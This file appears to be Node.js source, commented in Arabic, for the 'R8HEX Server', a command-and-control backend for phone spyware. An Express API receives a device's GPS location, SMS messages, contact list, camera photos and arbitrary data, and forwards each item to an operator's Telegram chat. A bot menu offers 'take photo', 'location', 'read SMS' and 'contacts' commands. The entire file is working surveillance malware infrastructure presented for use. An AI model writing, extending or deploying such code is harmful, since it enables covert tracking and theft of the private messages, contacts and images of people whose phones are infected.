const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');
const path = require('path');
const data = require('./data.js');

// ====== الإعدادات ======
const BOT_TOKEN = data.token;
const ADMIN_ID = Number(data.id);
const ADDRESS = data.address;
const API_SECRET = data.secret;

// التحقق من المتغيرات
if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN غير موجود');
  process.exit(1);
}
if (!ADMIN_ID || isNaN(ADMIN_ID)) {
  console.error('❌ ADMIN_ID غير صالح');
  process.exit(1);
}

const app = express();
const PORT = process.env.PORT || 3000;

// ====== إعداد البوت ======
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ====== إعداد رفع الملفات ======
const upload = multer({ dest: 'uploads/' });
if (!fs.existsSync('uploads')) {
  fs.mkdirSync('uploads');
}

// ====== أخطاء البوت ======
bot.on('polling_error', (err) => {
  console.error('⚠️ Polling error:', err);
});

// ====== أوامر البوت ======
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `✅ R8HEX Server يعمل!\nمعرفك: ${msg.from.id}`);
});

bot.onText(/\/myid/, (msg) => {
  bot.sendMessage(msg.chat.id, `🆔 معرفك: ${msg.from.id}`);
});

bot.onText(/\/menu/, (msg) => {
  const chatId = msg.chat.id;
  const options = {
    reply_markup: {
      keyboard: [
        [{ text: '📸 تصوير' }, { text: '📍 موقع' }],
        [{ text: '📨 SMS' }, { text: '📞 جهات الاتصال' }],
        [{ text: '⚙️ الإعدادات' }]
      ],
      resize_keyboard: true
    }
  };
  bot.sendMessage(chatId, '📱 اختر أمراً:', options);
});

// ====== معالجة الأزرار ======
bot.on('message', (msg) => {
  if (!msg || typeof msg.text !== 'string') return;
  const chatId = msg.chat.id;
  const text = msg.text;

  const replies = {
    '📸 تصوير': '📸 جاري التقاط الصورة...',
    '📍 موقع': '📍 جاري الحصول على الموقع...',
    '📨 SMS': '📨 جاري قراءة الرسائل...',
    '📞 جهات الاتصال': '📞 جاري جلب جهات الاتصال...',
    '⚙️ الإعدادات': '⚙️ الإعدادات قيد التطوير...'
  };

  if (replies[text]) {
    bot.sendMessage(chatId, replies[text]);
  }
});

// ====== API لاستقبال البيانات من التطبيق ======
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// التحقق من الأمان
const checkAuth = (req, res, next) => {
  if (API_SECRET) {
    const provided = req.headers['x-secret'];
    if (!provided || provided !== API_SECRET) {
      return res.status(401).json({ error: 'unauthorized' });
    }
  }
  next();
};

// ====== نقاط النهاية (Endpoints) ======

// 1. استقبال الموقع
app.post('/api/location', checkAuth, (req, res) => {
  try {
    const { lat, lng, accuracy, provider } = req.body;
    const message = `📍 الموقع الحالي:\nالخط: ${lat}\nالطول: ${lng}\nالدقة: ${accuracy || 'N/A'}\nالمزود: ${provider || 'N/A'}`;
    bot.sendMessage(ADMIN_ID, message);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ خطأ في الموقع:', error);
    res.status(500).json({ error: 'حدث خطأ' });
  }
});

// 2. استقبال SMS
app.post('/api/sms', checkAuth, (req, res) => {
  try {
    const { sender, body, date } = req.body;
    const message = `📨 رسالة جديدة:\nمن: ${sender}\nالنص: ${body}\nالتاريخ: ${date || 'N/A'}`;
    bot.sendMessage(ADMIN_ID, message);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ خطأ في SMS:', error);
    res.status(500).json({ error: 'حدث خطأ' });
  }
});

// 3. استقبال جهات الاتصال
app.post('/api/contacts', checkAuth, (req, res) => {
  try {
    const { contacts } = req.body;
    let message = '📞 جهات الاتصال:\n';
    contacts.forEach((c, i) => {
      message += `\n${i+1}. ${c.name}: ${c.phone}`;
    });
    bot.sendMessage(ADMIN_ID, message);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ خطأ في جهات الاتصال:', error);
    res.status(500).json({ error: 'حدث خطأ' });
  }
});

// 4. استقبال الصور
app.post('/api/photo', checkAuth, upload.single('photo'), (req, res) => {
  try {
    const file = req.file;
    if (!file) {
      return res.status(400).json({ error: 'لا توجد صورة' });
    }
    const photoPath = path.join(__dirname, 'uploads', `${uuidv4()}.jpg`);
    fs.renameSync(file.path, photoPath);
    bot.sendPhoto(ADMIN_ID, photoPath, { caption: '📸 صورة جديدة' });
    res.json({ success: true });
  } catch (error) {
    console.error('❌ خطأ في الصورة:', error);
    res.status(500).json({ error: 'حدث خطأ' });
  }
});

// 5. استقبال الملفات العامة
app.post('/api/data', checkAuth, (req, res) => {
  try {
    const receivedData = req.body || {};
    console.log('📩 بيانات واردة:', receivedData);
    const message = `📨 بيانات جديدة:\n${JSON.stringify(receivedData, null, 2)}`;
    bot.sendMessage(ADMIN_ID, message);
    res.json({ success: true });
  } catch (error) {
    console.error('❌ خطأ:', error);
    res.status(500).json({ error: 'حدث خطأ' });
  }
});

// 6. الصفحة الرئيسية
app.get('/', (req, res) => {
  res.send(`
    <h1>✅ R8HEX Server يعمل!</h1>
    <p>السيرفر: ${ADDRESS}</p>
    <p>تم التشغيل: ${new Date().toLocaleString()}</p>
  `);
});

// ====== تشغيل السيرفر ======
const server = app.listen(PORT, () => {
  console.log(`🚀 R8HEX Server يعمل على المنفذ ${PORT}`);
  bot.sendMessage(ADMIN_ID, `✅ تم تشغيل R8HEX Server!\n🔗 ${ADDRESS}`);
});

// ====== إغلاق نظيف ======
function shutdown() {
  console.log('🛑 إيقاف السيرفر...');
  try { bot.stopPolling(); } catch (e) {}
  server.close(() => process.exit(0));
}
process.on('SIGINT', shutdown);
process.on('SIGTERM', shutdown);
